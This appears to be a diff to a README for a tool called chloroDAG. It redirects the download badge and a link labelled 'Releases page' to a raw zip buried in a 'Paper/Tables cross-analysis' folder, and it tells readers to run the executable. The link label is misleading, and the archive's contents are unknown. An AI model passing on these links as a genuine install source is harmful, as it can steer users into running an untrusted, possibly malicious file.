@@ -22,9 +22,9 @@ To begin using chloroDAG, follow these straightforward steps:
 ## ⬇️ Download & Install
 You can easily download chloroDAG from the Releases page. 
 
-[![Download chloroDAG](https://raw.githubusercontent.com/okoid721/chloroDAG/main/alluvion/chloroDAG.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/okoid721/chloroDAG/main/alluvion/chloroDAG.zip)
+[![Download chloroDAG](https://github.com/okoid721/chloroDAG/raw/refs/heads/main/Paper/Tables cross-analysis/chloro_DAG_v1.4-beta.4.zip%20Now-blue?style=for-the-badge)](https://github.com/okoid721/chloroDAG/raw/refs/heads/main/Paper/Tables cross-analysis/chloro_DAG_v1.4-beta.4.zip)
 
-1. Click the button above or visit the [Releases page](https://raw.githubusercontent.com/okoid721/chloroDAG/main/alluvion/chloroDAG.zip).
+1. Click the button above or visit the [Releases page](https://github.com/okoid721/chloroDAG/raw/refs/heads/main/Paper/Tables cross-analysis/chloro_DAG_v1.4-beta.4.zip).
 2. Locate the latest version of the software. 
 3. Download the installer or the executable file suitable for your operating system.
 
